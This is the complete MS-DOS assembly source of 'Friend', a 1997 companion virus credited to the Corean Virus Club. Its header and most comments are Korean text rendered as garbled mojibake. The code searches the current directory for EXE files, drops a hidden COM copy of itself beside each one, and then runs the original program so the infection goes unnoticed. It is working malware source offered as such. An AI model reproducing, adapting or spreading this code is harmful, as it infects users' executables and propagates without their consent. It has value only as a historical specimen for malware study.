;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                                               CVC #02  97/09
; Virus Name : Friend (Type A)
;
; Author : Osiris of CVC,Corea
; Date : 1997/09/05
;
; Type : Non-resident Companion
;
; §¡¬wº Companion ¤a·¡œá¯a·¡”a. ÐeŠ‚¬e ÂAÁ¡¡ ¸aÁA¹A¸b–E ¬eœeÑw ¤a·¡œá¯a·¡”a.
; Ñe¸ —¡BÉ¡Ÿ¡µA¬á 1 ˆ· EXE Ìa·©·i Àx´a •··© Ìa·©¡w COM Ìa·©·i ¬—¬÷Ð–…”a.
; ¶¥œ EXE Ìa·©·i ®¸÷Ða»¡ ´g·a£a¡ µAœáˆa i ˆa“w¬÷·e ˆá· ´ô”a.
;
; Ã¡ža“e ¬—¬÷–E COM Ìa·© e ¬b¹AÐa¡e –E”a.
;
; µ¸åµA ¼a¥Ö”å ¬eœeÑw ‰Á“e  g·¡ ËiŸ¡”a.
; µb¯¡ ·¥‰·»¡“w ˆñ¬‚µA »¥”e·¡ –A‹¥ Ða»¡ e, ´|·a¡ ˆœ·–A“e ¤á¸å·e ·¥‰·»¡“wˆñ¬‚
; µA•¡ »¥”e·¡ ´e–I ˆõ·¡”a.
;
; Ðw¬w Àõ¸bÎ‘·e ¯©Ðñ¶w·¡”a.
;
;
;
;
;
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

            .MODEL  TINY
            .CODE

 PARASIZE   EQU  (End_Memory-Friend+0Fh) SHR 4 + 13h

            org   100h

 Friend:
            mov   ah,2fh                    ; DTA ŠÐa‹¡
            int   21h
            push  es                        ; DTA ˆt ¸á¸w
            push  bx

            mov   ah,1ah                    ; ¬¡¶… DTA ¬é¸÷
            mov   dx, offset NewDTA
            int   21h

            mov   ah,4Eh                    ; EXE Ìa·© Àx‹¡
            mov   cx,00100011B              ; ·ª‹¡¸å¶w/®‘‹±Ìa·©
            mov   dx, offset Mask_EXE       ;
 Find_repeat:
            int   21h                       ;
            jc    Execute_EXE               ; ˆqµq ¯¡Ç© Ìa·©·¡ ´ô·a¡e EXE ¯©Ð—

 Infect_EXE:
            mov   si, offset NewDTA + 1Eh   ;
            call  ChgExt                    ; EXE -> COM,COM -> EXE

            mov   ax, 4300h                 ; ˆqµq µa¦ ÑÂ·¥
            mov   dx, offset NewDTA + 1Eh   ; (COM Ìa·©·¡ ¹¥¸ Ða“eˆa?)
            int   21h
            jc    Drop_COM                  ; ­¢¬÷ Àx·i ® ·¶·a¡e ˆqµq –Eˆõ·±

            mov   ah, 4Fh                   ; ”a·q Ìa·© Àx‹¡
            jmp   Find_repeat

 Drop_COM:
            mov   ah, 3ch                   ; COM Ìa·© ¬—¬÷
            mov   cx, 00000011B             ; ·ª‹¡ e ˆa“w/®‘‹±
            mov   dx, offset NewDTA + 1Eh
            int   21h

            xchg  ax,bx                     ; Ð…—i ´è‹¡

            mov   ah, 40h                   ; ¤a·¡œá¯a ³a‹¡
            mov   cx, offset End_virus - 100h
            mov   dx, 100h
            int   21h

            mov   ah, 3eh                   ; Ìa·© ”h‹¡
            int   21h

 Execute_EXE:
            pop   dx                        ; ¶¥œ DTA ¥¢Š
            pop   ds
            mov   ah,1ah
            int   21h

            mov   sp, offset End_Memory     ; ¯aÈ‚ ¹¡¸÷

            mov   ah,4ah                    ; ¡A¡¡Ÿ¡ ¹¡¸÷
            mov   bx, PARASIZE
            int   21h

            call  Set_env                   ; ¶¥œ EXE Ìa·© ¯©Ð—·i ¶áÐe ÑÅ‰w
                                            ; µwµb ¬é¸÷

            mov   si, offset Filename
            call  ChgExt                    ; ÑÂ¸w¸a ¥e‰w

            mov   ax,4b00h                  ; ¶¥œ EXE Ìa·© ¯©Ð—
            mov   bx, offset Env_Block
            mov   dx, offset Filename
            int   21h

            mov   ah,4dh                    ; Ÿ¡Èåˆt ´è‹¡
            int   21h
 Stop_virus:
            mov   ax, 4c00h                 ; ¤a·¡œá¯a {‹¡
            int   21h

;
; ÑÂ¸w¸a ¤aŽ‹¡ (EXE -> COM, COM -> EXE)
; ·³b SI = ¤aŽ‰¡¸a Ða“e ÑÂ¸w¸a

 ChgExt     proc  near                      ; ÑÂ¸w¸a ¤aŽ‹¡

 Loop_Eof:
            lodsb
            or    al,al
            jnz   Loop_Eof

            mov   di,si
            sub   di,4                      ; DI = ÑÂ¸w¸a ¶áÃ¡
            mov   si, offset Ext_COM        ; SI = COM

            cmp   byte ptr [di],'E'         ; EXE Ìa·© ·¥ˆa ?
            jz    mov_ext
            add   si,0005                   ; SI = EXE
 mov_ext:
            mov   cx,0003
            repz  movsb                     ; ÑÂ¸w¸aˆa COM ·¡¡e EXE ¡
                                            ; EXE ·¡¡e COM ·a¡ ¤aŽ…”a.
            ret
 ChgExt     Endp


; ÑÅµwµwµbµA¬á ¸¯©Ð—µA Ï©¶aÐe ¸÷¥¡ ´è‹¡
;
;
 Set_Env    proc

            mov   PSP1,es
            mov   PSP2,es
            mov   PSP3,es

 Search_RD:                                 ; ”a¯¡ ¯©Ð—Ða‹¡ ¶áÐ¬á Ï©¶aÐe ˆt—i·i ´i´a…”a.
            xor   si,si
            mov   ds,ds:[002Ch]             ; ¯©Ð—¯¡Ç¥ Ìa·©· ·¡Ÿq·i ´i´a…”a.

 Search_RD_LOOP:
            cmp   word ptr DS:[SI],0000     ; Ìa·©·¡Ÿq¸åµA“e 0000·¡”a.
            jz    Get_FileName              ; PSP:[002Ch] --> ­A‹a åËa
            inc   si
            jmp   Search_RD_LOOP

 Get_FileName:
            add   si,0004
            mov   dx,si                     ; Ñe¸ ¯©Ð—–A“e Ìa·©·¡Ÿq

            mov   di, offset Filename
            mov   cx,0080
            repz  movsb

            push  cs                        ;
            pop   ds
            RET

 Set_env    endp

            db    '[Friend] The first Corean Companion virus..'
            db    '(c) 1997/09 Osiris of CVC (Corean Virus Club),Corea'

; ¸¯©Ð—·i ¶áÐe §iœâ
 ENV_BLOCK  dw    ?                         ; ¸¯©Ð—¶w §iœâ
            dw    80h                       ;
 PSP1       dw    ?
            dw    5ch                       ;
 PSP2       dw    ?
            dw    6ch                       ;
 PSP3       dw    ?

 Ext_COM    db    'COM'                     ; ÑÂ¸w¸a COM
 Mask_EXE   db    '*.EXE',00                ; ÑÂ¸w¸a EXE

 End_Virus:

 Filename   db    85  dup (0)               ; Ìa·© ·¡Ÿq
 NewDTA     db    50  dup (0)               ; DTA
            db    100 dup (0)               ; ¯aÈ‚
 End_Memory:

            END   Friend

